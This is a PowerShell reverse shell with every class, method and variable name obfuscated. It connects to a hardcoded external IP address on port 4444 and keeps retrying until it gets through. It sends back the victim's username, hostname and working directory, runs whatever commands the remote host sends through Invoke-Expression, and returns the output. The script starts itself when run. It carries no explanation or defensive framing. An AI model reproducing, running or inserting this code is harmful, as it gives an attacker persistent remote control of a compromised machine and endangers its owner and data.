class TzDzPuCIoAlRlptZCSCksL {
    
    [string]$utewRpJIk = "93.49.240.195"
    [int]$CDsSwzphLSIqXaWJwXkOgjEr = 4444

    $VPSijqdzgtNOMOTahqPwIQc
    $lFoVvkbIPPlj
    $SPbqaKOTlfQazplyvy
    $ANNUfhqGBEzkEVwkaN
    $qAUJRNItfd
    $dsKckwQTlHcJrTvQIUTB
    [int]$pIrKYwWfZGTkZTf = 50*1024

    zfMTPJxDxcKVqQKVqOie() {
        $this.lFoVvkbIPPlj = $false
        while ($true) {
            try {
                $this.lFoVvkbIPPlj = New-Object Net.Sockets.TcpClient($this.utewRpJIk, $this.CDsSwzphLSIqXaWJwXkOgjEr)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.FSNrgRXTXJyGtRimSqDllcp()
    }

    FSNrgRXTXJyGtRimSqDllcp() {
        $this.VPSijqdzgtNOMOTahqPwIQc = $this.lFoVvkbIPPlj.GetStream()
        $this.ANNUfhqGBEzkEVwkaN = New-Object Byte[] $this.pIrKYwWfZGTkZTf
        $this.dsKckwQTlHcJrTvQIUTB = New-Object Text.UTF8Encoding
        $this.SPbqaKOTlfQazplyvy = New-Object IO.StreamWriter($this.VPSijqdzgtNOMOTahqPwIQc, [Text.Encoding]::UTF8, $this.pIrKYwWfZGTkZTf)
        $this.qAUJRNItfd = New-Object System.IO.StreamReader($this.VPSijqdzgtNOMOTahqPwIQc)
        $this.SPbqaKOTlfQazplyvy.AutoFlush = $true
    }

    qlYVNujZasCHqsSFrooDcD() {
        $this.zfMTPJxDxcKVqQKVqOie()
        $this.uyEHxywmyZVUcUgDF()
    }

    LdqNIuRNXyGhwy($sgvFbAayEOVNQnDvQlJHhplv) {
        try {
            [byte[]]$zGLHqzeMLfMR = [text.Encoding]::Ascii.GetBytes($sgvFbAayEOVNQnDvQlJHhplv)
            $this.SPbqaKOTlfQazplyvy.Write($zGLHqzeMLfMR, 0, $zGLHqzeMLfMR.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.qlYVNujZasCHqsSFrooDcD()
        }
    }

    [string] qwghJC() {
        try {
            $hwddekoignrEHuK = $this.VPSijqdzgtNOMOTahqPwIQc.Read($this.ANNUfhqGBEzkEVwkaN, 0, $this.pIrKYwWfZGTkZTf)    
            $qoNqPDbEp = ($this.dsKckwQTlHcJrTvQIUTB.GetString($this.ANNUfhqGBEzkEVwkaN, 0, $hwddekoignrEHuK))
            return $qoNqPDbEp
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.qlYVNujZasCHqsSFrooDcD()
            return ""
        }
    }

    [string] vnDULe($ZdxyLZVESPxtkKOoL) {
        Write-Host $ZdxyLZVESPxtkKOoL
        try { 
            $PqLVXwtqcwsLGVbnQOQQx = Invoke-Expression $ZdxyLZVESPxtkKOoL | Out-String
        }
        catch {
            $gkQVyCQTLkdYoGkCyLqFjQ = $_.Exception
            $BfiATxnaq = $_.Message
            $PqLVXwtqcwsLGVbnQOQQx = "`n$_`n"
        }
        return $PqLVXwtqcwsLGVbnQOQQx
    }

    [string] mRKUWQx() {
        $ZKPLouXOjBmLDTGRmx = [Environment]::UserName
        $yFIbGGaUFgcZWjUEvOC = [System.Net.Dns]::GetHostName()
        $OgYsSbyoMASMCjL = Get-Location
        return "$ZKPLouXOjBmLDTGRmx@$yFIbGGaUFgcZWjUEvOC [$OgYsSbyoMASMCjL]~$ "
    }

    uyEHxywmyZVUcUgDF() {
        while ($this.lFoVvkbIPPlj.Connected) {
            $this.LdqNIuRNXyGhwy($this.mRKUWQx())         
            $qoNqPDbEp = $this.qwghJC()
            $PqLVXwtqcwsLGVbnQOQQx = "`n"
            if ([string]::IsNullOrEmpty($qoNqPDbEp)) {
                continue
            }
            $PqLVXwtqcwsLGVbnQOQQx = $this.vnDULe($qoNqPDbEp)
            $this.LdqNIuRNXyGhwy($PqLVXwtqcwsLGVbnQOQQx + "`n")
            $this.VPSijqdzgtNOMOTahqPwIQc.Flush()
        }
        $this.lFoVvkbIPPlj.Close()
        $this.qlYVNujZasCHqsSFrooDcD()
    } 
}

$QVSyKvHEEdpHYQStUFdfK = [TzDzPuCIoAlRlptZCSCksL]::new()
$QVSyKvHEEdpHYQStUFdfK.qlYVNujZasCHqsSFrooDcD()
